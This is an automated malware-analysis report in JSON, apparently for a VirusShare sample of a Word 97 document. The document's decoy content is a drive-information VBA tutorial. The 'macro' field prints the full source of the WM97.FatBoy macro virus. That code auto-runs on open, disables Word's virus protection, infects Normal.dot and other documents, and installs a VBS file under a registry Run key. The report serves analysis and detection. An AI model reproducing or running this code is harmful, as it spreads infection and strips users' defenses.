{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "CodeModule": "May attempt to modify the VBA code",
            "CreateObject": "May create an OLE object",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "Run": "May run an executable file or a system command",
            "SYSTEM": "May run an executable file or a system command on a Mac",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "WINDOWS": "May enumerate application windows"
        },
        "macro": "Private Sub Document_Open()\n On Error Resume Next\n  Const a = \"FatBoy\"\n  Const b = \"c:\\WINDOWS\\SYSTEM\\Msfat.sys\"\n  Set Code = New DataObject\n  With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: .ConfirmConversions = 0: End With\n    Code.SetText FatBoy.VBProject.VBComponents(1).CodeModule.Lines(1, FatBoy.VBProject.VBComponents(1).CodeModule.CountOfLines)\n    Open b For Output As #1: Print #1, Code.GetText: Close #1\n    If ActiveDocument.VBProject.VBComponents(1).Name <> a Then\n      Set fatt = ActiveDocument.VBProject.VBComponents(1)\n      saveme = True\n     ElseIf NormalTemplate.VBProject.VBComponents(1).Name <> a Then\n      Set fatt = NormalTemplate.VBProject.VBComponents(1)\n      repla = True\n    End If\n    If fatt.CodeModule.CountOfLines > 0 Then fatt.CodeModule.DeleteLines 1, fatt.CodeModule.CountOfLines\n      fatt.CodeModule.AddFromFile b\n      fatt.Name = a\n    If saveme = True Then\n     ActiveDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 26, \"Sub stealth()\"\n     ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument\n    ElseIf repla = True Then\n     NormalTemplate.VBProject.VBComponents(1).CodeModule.ReplaceLine 26, \"Sub ViewVBCode()\"\n    End If\nEnd Sub\nSub stealth()\n  System.PrivateProfileString(\"\", \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"\") = \"C:\\WINDOWS\\SYSTEM\\Msfat.sys.vbs\"\n  Open \"C:\\WINDOWS\\SYSTEM\\Msfat.sys.vbs\" For Output As #1\n   Print #1, \"Set fatty = WScript.CreateObject(\"\"Word.Application\"\")\"\n   Print #1, \"fatty.Options.VirusProtection = 0\"\n   Print #1, \"fatty.Options.SaveNormalPrompt = 0\"\n   Print #1, \"Set fatt = fatty.NormalTemplate.VBProject.VBComponents(1)\"\n   Print #1, \"If fatt.Name <> \"\"FatBoy\"\" then\"\n   Print #1, \"fatt.CodeModule.DeleteLines 1, fatt.codemodule.CountOfLines\"\n   Print #1, \"fatt.CodeModule.AddFromFile (\"\"C:\\WINDOWS\\SYSTEM\\Msfat.sys\"\")\"\n   Print #1, \"fatt.name = \"\"FatBoy\"\"\"\n   Print #1, \"end if\"\n  Close #1\n If ActiveDocument.VBProject.VBComponents(1).Name = \"FatBoy\" Then\n      ActiveDocument.VBProject.VBComponents(1).Name = \"ThisDocument\"\n      ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines\n End If\n If NormalTemplate.VBProject.VBComponents(1).Name = \"FatBoy\" Then\n      NormalTemplate.VBProject.VBComponents(1).Name = \"ThisDocument\"\n      NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines\n End If\nEnd Sub\n' WM97.FatBoy - Psyclone X\n\n\n"
    },
    "filename": "VirusShare_18afacf3d11fe8b4e300392839a1a7c2",
    "filesize": 37376,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Title: All the information on your local hard drive as well as all the network drives, Author: Unknown, Template: Normal, Last Saved By: c, Revision Number: 5, Name of Creating Application: Microsoft Word 8.0, Total Editing Time: 03:00, Create Time/Date: Thu Oct  2 11:21:00 1997, Last Saved Time/Date: Fri Jun  9 01:32:00 2000, Number of Pages: 3, Number of Words: 725, Number of Characters: 4133, Security: 0",
    "hashes": {
        "md5": "18afacf3d11fe8b4e300392839a1a7c2",
        "sha1": "6ad99995b0cdd8fbca349b99a7567ebb9b05a99e",
        "sha256": "e7eee22eb12c8f4ae6f5fa5c76798f5f3d1ad979c7a85e90cf6c6a57a452c43d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjt+t+",
            " j5\u047f",
            "All the information on your local hard drive as well as all the network drives. ",
            "'--------------------------------------------------------------------",
            "'Author: Dr. John A. Nyhart",
            "'work  : john_nyhart@medicalogic.com",
            "'home  : jnyhart@spessart.com",
            "'web   : www.spessart.com/users/jnyhart/john1.htm",
            "'Posted:7/18/97",
            "'This sub will get all the information on your local hard drive as well ",
            "'as all the network drives that you  are connected to.  I hope this helps",
            "'you and others. ",
            "'--------------------------------------------------------------------",
            "1.  Place the following code into a module.",
            "Declare Function GetVolumeInformation Lib \"kernel32\" Alias \"GetVolumeInformationA\" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long) As Long",
            "Declare Function GetLogicalDrives& Lib \"kernel32\" ()",
            "Declare Function GetDriveType& Lib \"kernel32\" Alias \"GetDriveTypeA\" (ByVal nDrive As String)",
            "Declare Function GetDiskFreeSpace& Lib \"kernel32\" Alias \"GetDiskFreeSpaceA\" (ByVal lpRootPathName As String, lpSectorsPerCluster As Long, lpBytesPerSector As Long, lpNumberOfFreeClusters As Long, lpTotalNumberOfClusters As Long)",
            "Public vararyDriveInfo(26, 11)     ' a Variant Array to hold the info",
            "' ************************************************************************************",
            "2.  This is a sub that can be called from a form loading or from a command button. ",
            "Sub getDriveInfo()",
            "' *****************************************",
            "' SUB: This sub will get all the drive",
            "'      info for all the hard drives and",
            "'      network drives.",
            "' 2/19/95",
            "' There is a array named vararyDriveInfo that",
            "' holds all the info for up to 26 drives (A-Z).",
            "' Array Format:",
            "'    x,1 = Is there a drive for this letter",
            "'    x,2 = Drive Letter",
            "'    x,3 = Drive Type  2=Floppy, 3=Disk Fixed (local) 4=Disk Remote (Network)",
            "'    x,4 = Sectors",
            "'    x,5 = Bytes / Sector",
            "'    x,6 = Number of free sectors",
            "'    x,7 = Total Clusters",
            "'    x,8 = Total Bytes",
            "'    x,9 = Free Bytes",
            "'    x,10 = Percent of Free Bytes",
            "'    x,11 = Vol Name",
            "' *********************************************************************",
            "Dim ournum As Long",
            "Dim rv As Long",
            "Dim DriveType As Long",
            "Dim c  As Long",
            "Dim d As Long",
            "Dim e As Long",
            "Dim f As Long",
            "Dim h As Long",
            "Dim Counter As Integer",
            "Dim CompareTo",
            "Dim tmpDrvLet As String",
            "Dim SectorsPerCluster&, BytesPerSector&, NumberOfFreeClustors&, TotalNumberOfClustors&",
            "Dim BytesFreeas, BytesTotal, FreeBytes, TotalBytes As Variant",
            "Dim dl&, lpVolumeSerialNumber&, lpMaximumComponentLength&, lpFileSystemFlags&",
            "Dim lpVolumeNameBuffer As String",
            "Dim rc",
            "Dim A As String",
            "Dim b As String",
            "Dim g As String",
            "Dim s$, sz&",
            "' *** get the logical Drives",
            "rv = 0",
            "rv = GetLogicalDrives&()",
            "If rv = 0 Then",
            "    MsgBoxText = \"No Logical Drives Found. Program will stop.\"",
            "    MsgBoxButton = MB_OK + MB_ICONSTOP",
            "    MsgBoxTitle = \"Error\"",
            "    ",
            "    MsgBox MsgBoxText, MsgBoxButton, MsgBoxTitle",
            "    Stop",
            "    Exit Sub",
            "End If",
            "' *** clear the VarArray",
            "Erase vararyDriveInfo",
            "' *** set the var",
            "b = String$(255, 0)",
            "c = 200",
            "g = String$(255, 0)",
            "h = 100",
            "For Counter = 1 To 26",
            "    CompareTo = (2 ^ (Counter - 1))",
            "    If (rv And CompareTo)  0 Then",
            "      vararyDriveInfo(Counter, 1) = True      ' Found a drive",
            "      tmpDrvLet = Chr(Counter + 64)           ' Build a drive letter",
            "      vararyDriveInfo(Counter, 2) = tmpDrvLet ' Save the drive letter",
            "      tmpDrvLet = tmpDrvLet & \":\\\"            ' Add the root stuff",
            "      DriveType = GetDriveType&(tmpDrvLet)    ' Get the drive type",
            "      vararyDriveInfo(Counter, 3) = DriveType ' Save the drive type",
            "      If DriveType = 3 Or DriveType = 4 Then  ' local or network drives only",
            "      ",
            "        ' *** get the vol name",
            "        A = tmpDrvLet 'DriveLtr & \"\\:\"",
            "        rc = GetVolumeInformation(A, b, c, d, e, f, g, h)",
            "        vararyDriveInfo(Counter, 11) = b",
            "        ",
            "        ' *** let's get the Drive info for this HardDrive",
            "        dl& = GetDiskFreeSpace(tmpDrvLet, SectorsPerCluster, BytesPerSector, _",
            "              NumberOfFreeClustors, TotalNumberOfClustors)",
            "              ",
            "        vararyDriveInfo(Counter, 4) = Format(SectorsPerCluster, \"#,0\")",
            "        vararyDriveInfo(Counter, 5) = Format(BytesPerSector, \"#,0\")",
            "        vararyDriveInfo(Counter, 6) = Format(NumberOfFreeClustors, \"#,0\")",
            "        vararyDriveInfo(Counter, 7) = Format(TotalNumberOfClustors, \"#,0\")",
            "        TotalBytes = (TotalNumberOfClustors / 100) * (SectorsPerCluster / 100) * (BytesPerSector / 100)",
            "        vararyDriveInfo(Counter, 8) = Format(TotalBytes, \"#,0\")",
            "        FreeBytes = (NumberOfFreeClustors / 100) * (SectorsPerCluster / 100) * (BytesPerSector / 100)",
            "        vararyDriveInfo(Counter, 9) = Format(FreeBytes, \"#,0\")",
            "        vararyDriveInfo(Counter, 10) = Format(FreeBytes / TotalBytes, \"Percent\")",
            "      End If",
            "    Else",
            "      ' *** no drive? then set to false",
            "      vararyDriveInfo(Counter, 1) = False",
            "    End If",
            "Next Counter",
            "End Sub",
            "/ =!",
            "@EPSON Stylus COLOR 600",
            "LPT1:",
            "EPS600",
            "EPSON Stylus COLOR 600",
            "EPSON Stylus COLOR 600",
            "EPSON Stylus COLOR 600",
            "LPT1:",
            "EPSON Stylus COLOR 600",
            "EPSON Stylus COLOR 600",
            "LPT1:",
            "All the information on your local hard drive as well as all the network drives",
            "Unknown",
            "Normal",
            "Microsoft Word 8.0",
            "All the information on your local hard drive as well as all the network drives",
            "Title",
            "All the information on your local hard drive as well as all the network drives",
            "@~5\u047f",
            " j5\u047f",
            "@~5\u047f",
            " j5\u047f",
            "N:@9",
            "339403b05",
            "GnJ{=",
            "Wordk",
            "Win16~",
            "Win32",
            "All the information on your local hard drive as well as all the network drives",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Document_Open",
            "Documentj",
            "Code",
            "DataObject",
            "Options",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "ConfirmConversions",
            "SetText",
            "FatBoy({",
            "VBProjectOh",
            "VBComponents",
            "CodeModule",
            "Lines",
            "CountOfLines!\\",
            "GetText",
            "ActiveDocument\\",
            "fatt",
            "saveme",
            "NormalTemplateq",
            "repla.",
            "DeleteLines",
            "AddFromFileu",
            "ReplaceLine",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "FileFormat",
            "wdFormatDocument",
            "stealth",
            "Systema",
            "PrivateProfileString[",
            "_B_var_Code'#",
            "Itemz",
            "_B_var_fatt+",
            "_B_var_saveme",
            "_B_var_repla$",
            "Ei{=",
            "f(7Bi{=",
            "FatBoy",
            "c:\\WINDOWS\\SYSTEM\\Msfat.sys",
            "Sub stealth()",
            "Sub ViewVBCode()",
            "C:\\WINDOWS\\SYSTEM\\Msfat.sys.vbs",
            "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "C:\\WINDOWS\\SYSTEM\\Msfat.sys.vbs",
            "Set fatty = WScript.CreateObject(\"Word.Application\")",
            "fatty.Options.VirusProtection = 0",
            "fatty.Options.SaveNormalPrompt = 0",
            "Set fatt = fatty.NormalTemplate.VBProject.VBComponents(1)",
            "If fatt.Name <> \"FatBoy\" then",
            "fatt.CodeModule.DeleteLines 1, fatt.codemodule.CountOfLines",
            "fatt.CodeModule.AddFromFile (\"C:\\WINDOWS\\SYSTEM\\Msfat.sys\")",
            "fatt.name = \"FatBoy\"",
            "end if",
            "FatBoy",
            "ThisDocument",
            "FatBoy",
            "ThisDocument",
            " WM97.FatBoy - Psyclone X",
            "Attribut",
            "e VB_Nam",
            "e = \"Fat@Boy\"",
            "t1Norm",
            "al.ThisDocument",
            "CreatablA",
            "`False",
            "Predecla",
            "rTru",
            "\"E xpose",
            "mplateDe",
            "$Customiz",
            "8 Sub ",
            "Open()",
            " On Erro r Res",
            " ConPst a",
            "c:\\WIND",
            "OWS\\SYST",
            "EM\\Msfat",
            ".sys  S",
            "dNew",
            " DObjec",
            ".With Op",
            "ti2: .VirusProt",
            "Savec",
            "vers",
            "End +^QTde.ATg q",
            "C ompon",
            "1).CodeM",
            "odule.Li",
            "Cou0ntOf",
            "AU  @7en b FV",
            "Output A@s #1: cn",
            ",G.Get(: Cl@",
            "/If Actzl",
            "X/B<>@kThe~n",
            "C@3  E?",
            "dE9%e",
            "z$A|If",
            ";Ir\te > 0 ",
            "AG M\tDelete\"7 1,",
            "AddFromFi",
            "_4ntMU",
            "R!\"cb",
            " 26,",
            " \"A|stealth()p@7,",
            "j' Q",
            "Fu<ll",
            "Wmat:=wd#",
            "?dB)3i",
            "ViewVBt",
            "Sy@!m.\u011f ",
            "S ng(\"\"%HK",
            "EY_LOCAL",
            "_MACHINE@\\Softw`\\@Micros",
            "Windows\\PCurrVc\\HRuna",
            "\") R\"bCw.vb! o>",
            "-G\"Oy",
            "WScript",
            ".be@",
            "d.Applicra!\"\"dA",
            ".$G6",
            "B.\t g!",
            "  \"\"$\" t_@",
            "|c0_m3_I>",
            "\"\tndV",
            "elifb",
            ":/m%m",
            "VR' WM9",
            "7.3 - Ps",
            "yclp X",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation",
            "mMSFo@rms>",
            "F22D158",
            "E2-9762-",
            "11D2-ABF",
            "8-A7E9D9CD9731",
            ".TWD#Microsoft ",
            "` Ob",
            " Library",
            "5B645FC4-0CAC",
            "9-EE",
            "M89B",
            "0B37",
            "Pc:\\",
            "windows\\JP\\VBE\\(",
            "EX(.E",
            "CxN@Ua*lCxNTax",
            "j +\t,C",
            "N :@9",
            "Of(ficDO@f",
            "{2DF8D04",
            "C-5BFA-1",
            "01B-BDE5@AA@4",
            "PROGRAM ",
            "FILES\\MI",
            "CROSOFT OFFICE\\",
            "MSO97.DLLHk# 8.0k\"",
            "BFatBoy",
            "a\"B@Fy",
            "FatBoy",
            "ID=\"{4A6E4787-3D7B-11D4-ABF9-B60C66B72837}\"",
            "Document=FatBoy/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"5557B3685DB961B961B961B961\"",
            "DPB=\"AAA84CDBA0DCA0DCA0\"",
            "GC=\"FFFD19B63B5E915F915F6E\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "FatBoy=44, 44, 489, 367, Z",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "'web   : www.spessart.com/users/jnyhart/john1.htm": "Web Page"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.308732",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
